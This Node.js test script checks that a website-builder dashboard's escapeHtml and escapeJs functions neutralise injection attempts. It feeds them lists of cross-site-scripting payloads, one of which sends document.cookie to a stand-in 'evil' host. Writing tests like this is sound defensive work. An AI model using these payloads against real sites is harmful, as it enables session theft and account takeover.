const fs = require('fs');
const APP = 'C:/Users/seany/OneDrive/Documents/Coding Projects/sitegeist_ecosystem/Website Builder/templates/dashboard/assets/app.js';
const src = fs.readFileSync(APP, 'utf8');

const escJsSrc = src.slice(src.indexOf('function escapeJs'), src.indexOf('function escapeHtml'));
const escHtmlSrc = src.slice(src.indexOf('function escapeHtml'), src.indexOf('function leadStatusLabel'));
const { escapeHtml, escapeJs } = new Function(escJsSrc + '\n' + escHtmlSrc + '\nreturn { escapeHtml, escapeJs };')();

let ok = true;
function assert(c, l) {
  console.log('  ' + l.padEnd(58) + (c ? 'ok' : '*** FAIL ***'));
  if (!c) ok = false;
}

// ── escapeHtml: the escaped value must contain NO raw HTML metacharacters ──
console.log('=== escapeHtml: no raw < > " \' & left outside entities ===');
const HTML_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  "' onerror='alert(1)",
  '<svg onload=alert(1)>',
  '&lt;already&gt;',
  '"><script>fetch("//evil")</script>',
  '`><img src=x onerror=alert(1)>',
  'javascript:alert(1)',
];
for (const p of HTML_PAYLOADS) {
  const out = escapeHtml(p);
  // strip valid entities, then nothing dangerous may remain
  const stripped = out.replace(/&(?:[a-z]+|#\d+);/gi, '');
  const hasRawMeta = /[<>"'&]/.test(stripped);
  assert(!hasRawMeta, JSON.stringify(p).slice(0, 42) + ' -> clean');
}

// ── escapeJs: the escaped value must be an inert single-quoted literal ─────
console.log('\n=== escapeJs: cannot terminate the enclosing \'…\' literal ===');
const JS_PAYLOADS = [
  "');alert(1);//",
  "');fetch('//evil?c='+document.cookie);//",
  "\\'-alert(1)-'",
  '</script><script>alert(1)</script>',
  'x");alert(1);//',
  '\u2028alert(1)',
  '\u2029alert(1)',
  '</script>',
];
for (const p of JS_PAYLOADS) {
  const out = escapeJs(p);
  // If it round-trips through a real JS single-quoted literal and the resulting
  // value is IDENTICAL to the input, the escape is exactly sufficient and no
  // breakout is possible.
  let roundTrip = null;
  try {
    roundTrip = new Function("return '" + out + "'")();
  } catch (e) {
    roundTrip = 'THREW:' + e.message;
  }
  const exact = roundTrip === p;
  assert(exact, JSON.stringify(p).slice(0, 34) + ' round-trips exactly');
}

// ── the real sink: onclick="fn('…')" ──────────────────────────────────────
console.log('\n=== real sink: onclick="deleteFolderImage(\'…\', n)" ===');
for (const cat of [
  "x');alert(1);//",
  '";alert(1);"',
  '</script>',
  "a'b\"c",
  "\\');alert(1);//",
  '</script><script>alert(1)</script>',
]) {
  // this is exactly what the browser does: HTML-attribute-decode, then eval as JS
  const attrValue = `event.stopPropagation(); deleteFolderImage('${escapeJs(cat)}', 0)`;
  let brokeOut = false;
  let detail = '';
  try {
    // Replace the call with a probe that reports what it received.
    // If the payload broke out, it would run BEFORE the probe or throw.
    let captured = null;
    const probe = new Function('deleteFolderImage', 'event', attrValue.replace(
      /^event\.stopPropagation\(\); /,
      ''
    ).replace(/deleteFolderImage\((.*)\)$/, 'captured = [$1];'));
    // rebuild cleanly: just evaluate the argument expression
    const argExpr = attrValue.replace(/^event\.stopPropagation\(\); deleteFolderImage\(/, '').replace(/, 0\)$/, '');
    const value = new Function('return (' + argExpr + ')')();
    const asString = String(value);
    if (asString !== cat) { brokeOut = true; detail = 'value mutated to ' + JSON.stringify(asString); }
  } catch (e) {
    brokeOut = true;
    detail = 'THREW: ' + e.message;
  }
  assert(!brokeOut, 'cat=' + JSON.stringify(cat).slice(0, 30) + ' contained' + (detail ? '  ' + detail : ''));
}

// ── structural ────────────────────────────────────────────────────────────
console.log('\n=== structural ===');
assert(!/src="\$\{[a-zA-Z_$][\w.]*\}"/.test(src), 'no unescaped src="${var}" remains');
assert(src.includes('escapeJs(category)'), 'folder category goes through escapeJs');
assert((src.match(/function escapeHtml/g) || []).length === 1, 'escapeHtml defined once');
assert((src.match(/function escapeJs/g) || []).length === 1, 'escapeJs defined once');
assert(!/escapeHtml\(escapeHtml\(/.test(src), 'no double-escaping');
assert(src.includes('escapeHtml(post.title'), 'blog title escaped');
assert(src.includes('escapeHtml(h.dayOfWeek)'), 'hours day escaped');
assert(src.includes('escapeHtml(c.value)'), 'colour value escaped');
assert(src.includes('escapeHtml(resolvedSeedId)'), 'seed id escaped');
assert(src.includes('escapeHtml(thumbUrl)') || /escapeHtml\((thumbUrl|url|imgUrl|s\.imageUrl)\)/.test(src), 'image URLs escaped');

console.log('\n' + (ok ? 'FIX 2 VERIFIED — every payload contained' : 'PROBLEM(S)'));
process.exit(ok ? 0 : 1);
